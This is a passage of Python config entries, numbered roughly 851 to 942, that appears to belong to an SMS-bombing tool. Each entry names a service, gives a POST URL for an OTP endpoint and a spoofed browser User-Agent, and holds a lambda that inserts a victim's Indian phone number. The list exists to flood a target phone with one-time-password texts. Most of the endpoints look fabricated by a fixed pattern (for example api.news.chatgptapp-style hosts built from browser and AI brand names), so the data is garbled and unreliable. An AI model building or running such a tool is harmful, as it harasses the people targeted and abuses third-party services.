    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 851
{
    'name': 'RSSBandit_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.rssbandit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 852
{
    'name': 'RSSGuard_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.rssguard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 853
{
    'name': 'FluentReader_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.fluentreader.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 854
{
    'name': 'GoodLinks_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.goodlinks.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 855
{
    'name': 'Curtail_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.curtail.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 856
{
    'name': 'Wallabag_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.wallabag.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 857
{
    'name': 'Shiori_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.shiori.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 858
{
    'name': 'LinkAce_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.linkace.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 859
{
    'name': 'Raindrop_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.raindrop.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 860
{
    'name': 'BookmarkOS_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.bookmarkos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 861
{
    'name': 'StartMe_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.startme.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 862
{
    'name': 'Papaly_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.papaly.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 863
{
    'name': 'Booky_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.booky.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 864
{
    'name': 'Diigo_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.diigo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 865
{
    'name': 'Delicious_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.delicious.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 866
{
    'name': 'Pinboard_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.pinboard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 867
{
    'name': 'ScoopIt_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.scoopit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 868
{
    'name': 'Paperli_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.paperli.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 869
{
    'name': 'Flipboard_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.flipboard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 870
{
    'name': 'SmartNews_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.smartnews.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 871
{
    'name': 'Google_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.googleapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 872
{
    'name': 'Apple_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.appleapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 873
{
    'name': 'Yahoo_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.yahooapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 874
{
    'name': 'MSN_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.msnapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 875
{
    'name': 'AOL_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.aolapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 876
{
    'name': 'Reddit_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.redditapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 877
{
    'name': 'Twitter_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.twitterapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 878
{
    'name': 'Facebook_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.facebookapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 879
{
    'name': 'LinkedIn_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.linkedinapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 880
{
    'name': 'Pocket_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.pocketapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 881
{
    'name': 'Instapaper_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.instapaperapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 882
{
    'name': 'Readwise_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.readwiseapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 883
{
    'name': 'Matter_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.matterapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 884
{
    'name': 'Feedly_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.feedlyapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 885
{
    'name': 'Inoreader_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.inoreaderapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 886
{
    'name': 'NewsBlur_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.newsblurapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 887
{
    'name': 'TheOldReader_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.theoldreaderapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 888
{
    'name': 'NetNewsWire_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.netnewswireapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 889
{
    'name': 'Reeder_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.reederapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 890
{
    'name': 'Fiery_Feeds_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.fieryfeedsapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 891
{
    'name': 'Unread_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.unreadapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 892
{
    'name': 'Lire_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.lireapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 893
{
    'name': 'ReadKit_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.readkitapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 894
{
    'name': 'Vienna_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.viennaapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 895
{
    'name': 'RSSOwl_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.rssowlapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 896
{
    'name': 'QuiteRSS_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.quiterssapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 897
{
    'name': 'Liferea_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.lifereaapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 898
{
    'name': 'FeedReader_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.feedreaderapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 899
{
    'name': 'RSSBandit_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.rssbanditapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 900
{
    'name': 'RSSGuard_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.rssguardapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 901
{
    'name': 'FluentReader_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.fluentreaderapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 902
{
    'name': 'GoodLinks_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.goodlinksapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 903
{
    'name': 'Curtail_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.curtailapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 904
{
    'name': 'Wallabag_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.wallabagapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 905
{
    'name': 'Shiori_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.shioriapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 906
{
    'name': 'LinkAce_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.linkaceapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 907
{
    'name': 'Raindrop_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.raindropapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 908
{
    'name': 'BookmarkOS_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.bookmarkosapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 909
{
    'name': 'StartMe_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.startmeapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 910
{
    'name': 'Papaly_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.papalyapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 911
{
    'name': 'Booky_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.bookyapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 912
{
    'name': 'Diigo_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.diigoapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 913
{
    'name': 'Delicious_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.deliciousapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 914
{
    'name': 'Pinboard_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.pinboardapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 915
{
    'name': 'ScoopIt_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.scoopitapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 916
{
    'name': 'Paperli_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.paperliapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 917
{
    'name': 'Flipboard_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.flipboardapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 918
{
    'name': 'SmartNews_News_App_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.smartnewsapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 919
{
    'name': 'Opera_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.opera.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 920
{
    'name': 'Brave_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.brave.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 921
{
    'name': 'Vivaldi_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.vivaldi.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 922
{
    'name': 'Firefox_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.firefox.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 923
{
    'name': 'Chrome_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.chrome.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 924
{
    'name': 'Edge_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.edge.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 925
{
    'name': 'Safari_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.safari.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 926
{
    'name': 'DuckDuckGo_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.duckduckgo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 927
{
    'name': 'Ecosia_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.ecosia.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 928
{
    'name': 'Qwant_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.qwant.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 929
{
    'name': 'Startpage_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.startpage.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 930
{
    'name': 'Search_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.search.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 931
{
    'name': 'Yandex_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.yandex.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 932
{
    'name': 'Bing_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.bing.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 933
{
    'name': 'Yahoo_News_Search_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.yahoosearch.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 934
{
    'name': 'Ask_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.ask.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 935
{
    'name': 'AOL_News_Search_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.aolsearch.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 936
{
    'name': 'Wolfram_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.wolfram.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 937
{
    'name': 'Perplexity_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.perplexity.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 938
{
    'name': 'Claude_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.claude.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 939
{
    'name': 'Gemini_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.gemini.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 940
{
    'name': 'ChatGPT_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.chatgpt.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 941
{
    'name': 'DeepSeek_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.news.deepseek.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 942
{
    'name': 'Copilot_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
